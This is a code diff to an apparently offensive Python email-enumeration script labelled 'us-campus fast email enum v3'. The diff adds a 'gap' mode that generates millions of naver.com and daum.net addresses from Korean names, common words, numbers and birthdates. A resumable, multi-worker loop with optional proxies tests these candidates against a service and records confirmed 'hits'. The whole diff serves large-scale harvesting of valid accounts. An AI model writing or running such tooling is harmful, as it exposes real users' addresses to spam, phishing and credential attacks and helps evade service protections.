@@ -27,6 +27,16 @@ STATE_DIR = BASE / "email_enum_state"
 TESTED_DB = STATE_DIR / "tested.db"
 GLOBAL_HITS = STATE_DIR / "hits_all.jsonl"
 CAND_VERSION = 4
+CAND_GAP_VERSION = 1
+
+GAP_GIVEN = [
+    "seo", "shin", "oh", "sun", "ma", "mok", "ban", "bang", "go", "cha", "woo", "jun", "hae", "kwon",
+    "im", "lim", "song", "hong", "heo", "nam", "min", "jin", "ho", "ji", "yeon", "hyun", "soo", "young",
+    "mi", "sora", "areum", "eun", "bin", "su", "ri", "na", "bo", "tae", "in", "a",
+]
+GAP_COMMONS = ["sun", "moon", "blue", "gold", "happy", "sky", "king", "star", "apple", "love", "red", "vip"]
+GAP_SURNAMES_TOP = ["kim", "lee", "park", "choi", "jung", "cho", "kang", "yoon", "lim", "han"]
+GAP_SHORT = ["ma", "mok", "ban", "bang", "go", "bae", "nam", "heo", "hur", "kwak", "bae"]
 
 ALL_SURNAMES = [
     "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "jo", "yoon", "yun", "jang", "lim", "im",
@@ -211,6 +221,75 @@ def iter_slim_emails(surnames):
                     yield e
 
 
+def iter_gap_emails():
+    """分析报告 P1-P4: 短名+数字 / commons+5位 / 姓氏生日 / 姓氏+4位"""
+    seen = set()
+
+    def emit(local, dom="naver.com"):
+        e = f"{local}@{dom}".lower()
+        if e in seen:
+            return
+        seen.add(e)
+        yield e
+
+    for g in GAP_GIVEN:
+        for n in range(10000):
+            yield from emit(f"{g}{n:04d}")
+
+    for c in GAP_COMMONS:
+        for n in range(100000):
+            yield from emit(f"{c}{n:05d}")
+
+    for s in GAP_SURNAMES_TOP:
+        for y in range(1975, 2006):
+            for m in range(1, 13):
+                for d in range(1, 32):
+                    try:
+                        date(y, m, d)
+                    except ValueError:
+                        continue
+                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
+                    yield from emit(f"{s}{bd}")
+                    if s in GAP_SURNAMES_TOP[:5]:
+                        yield from emit(f"{s}{bd}", "daum.net")
+        for n in range(10000):
+            yield from emit(f"{s}{n:04d}")
+
+    for s in GAP_SHORT:
+        for n in range(10000):
+            yield from emit(f"{s}{n:04d}")
+
+
+def ensure_gap_candidate_file(gap_dir: Path, seen_hit: set):
+    cand_file = gap_dir / "candidates.txt"
+    meta_file = gap_dir / "candidates.meta.json"
+    if cand_file.exists() and meta_file.exists():
+        try:
+            meta = json.loads(meta_file.read_text(encoding="utf-8"))
+            if meta.get("version") == CAND_GAP_VERSION and meta.get("count", 0) > 0:
+                return cand_file, meta["count"]
+        except Exception:
+            pass
+
+    print("loading tested set for gap candidate filter...", flush=True)
+    tested = TestedStore(TESTED_DB, load_mem=True)
+    print(f"tested loaded {len(tested)}", flush=True)
+    t0 = time.time()
+    count = 0
+    with open(cand_file, "w", encoding="utf-8") as f:
+        for e in iter_gap_emails():
+            if e in tested or e in seen_hit:
+                continue
+            f.write(e + "\n")
+            count += 1
+    meta_file.write_text(
+        json.dumps({"version": CAND_GAP_VERSION, "count": count, "built": time.time()}, indent=2),
+        encoding="utf-8",
+    )
+    print(f"gap candidates written {count} in {time.time()-t0:.1f}s", flush=True)
+    return cand_file, count
+
+
 def make_opener(proxy_url: str = ""):
     handlers = [HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX)]
     if proxy_url:
@@ -355,7 +434,12 @@ def read_batch(cand_file: Path, offset: int, size: int):
 
 def run_shard(args):
     STATE_DIR.mkdir(parents=True, exist_ok=True)
-    shard_dir = STATE_DIR / f"shard_{args.shard}"
+    if args.dict == "gap":
+        shard_dir = STATE_DIR / "gap"
+        shard_label = "gap"
+    else:
+        shard_dir = STATE_DIR / f"shard_{args.shard}"
+        shard_label = str(args.shard)
     shard_dir.mkdir(parents=True, exist_ok=True)
     out_dir = shard_dir / "run"
     out_dir.mkdir(parents=True, exist_ok=True)
@@ -368,10 +452,17 @@ def run_shard(args):
 
     tested_store = TestedStore(TESTED_DB, load_mem=False)
     hits, seen_hit = load_hits()
-    surnames = shard_surnames(args.shard, args.shards)
-    print(f"shard={args.shard}/{args.shards} workers={args.workers} proxy={'yes' if args.proxy else 'no'}", flush=True)
+    print(
+        f"dict={args.dict} shard={shard_label} workers={args.workers} "
+        f"proxy={'yes' if args.proxy else 'no'} target={args.target}",
+        flush=True,
+    )
 
-    cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, seen_hit, args.shards)
+    if args.dict == "gap":
+        cand_file, total_cands = ensure_gap_candidate_file(shard_dir, seen_hit)
+    else:
+        surnames = shard_surnames(args.shard, args.shards)
+        cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, seen_hit, args.shards)
     print(f"candidates={total_cands} file={cand_file}", flush=True)
 
     line_no, file_offset = load_resume(cand_file, shard_dir)
@@ -470,12 +561,12 @@ def run_shard(args):
             with hits_lock:
                 if em not in seen_hit:
                     seen_hit.add(em)
-                    rec = {"email": em, "message": msg, "ts": time.time(), "shard": args.shard}
+                    rec = {"email": em, "message": msg, "ts": time.time(), "shard": shard_label}
                     hits.append(rec)
                     pending_global_hits.append(rec)
                     with open(hits_path, "a", encoding="utf-8") as hf:
                         hf.write(json.dumps(rec, ensure_ascii=False) + "\n")
-                    print(f"HIT shard{args.shard} total={len(hits)} {em}", flush=True)
+                    print(f"HIT {shard_label} total={len(hits)} {em}", flush=True)
                     if len(hits) >= args.target:
                         stop_flag.set()
         return em
@@ -519,7 +610,7 @@ def run_shard(args):
             elapsed = time.time() - start
             rps = stats["tested"] / elapsed if elapsed else 0
             line = (
-                f"shard={args.shard} line={line_no}/{total_cands} tested={stats['tested']} "
+                f"dict={args.dict} shard={shard_label} line={line_no}/{total_cands} tested={stats['tested']} "
                 f"hits={len(hits)} errors={stats['errors']} retried={stats['retried']} rps={rps:.1f} elapsed={elapsed:.0f}s"
             )
             print(line, flush=True)
@@ -527,7 +618,8 @@ def run_shard(args):
             state_path.write_text(
                 json.dumps(
                     {
-                        "shard": args.shard,
+                        "shard": shard_label,
+                        "dict": args.dict,
                         "line": line_no,
                         "offset": file_offset,
                         "total": total_cands,
@@ -551,11 +643,12 @@ def run_shard(args):
                 pending_global_hits.clear()
 
     export_results(out_dir, hits)
-    print(f"DONE shard={args.shard} hits={len(hits)} tested={stats['tested']} errors={stats['errors']}", flush=True)
+    print(f"DONE dict={args.dict} shard={shard_label} hits={len(hits)} tested={stats['tested']} errors={stats['errors']}", flush=True)
 
 
 def main():
     ap = argparse.ArgumentParser(description="us-campus fast email enum v3")
+    ap.add_argument("--dict", choices=["slim", "gap"], default="slim")
     ap.add_argument("--shard", type=int, default=0)
     ap.add_argument("--shards", type=int, default=4)
     ap.add_argument("--workers", type=int, default=80)
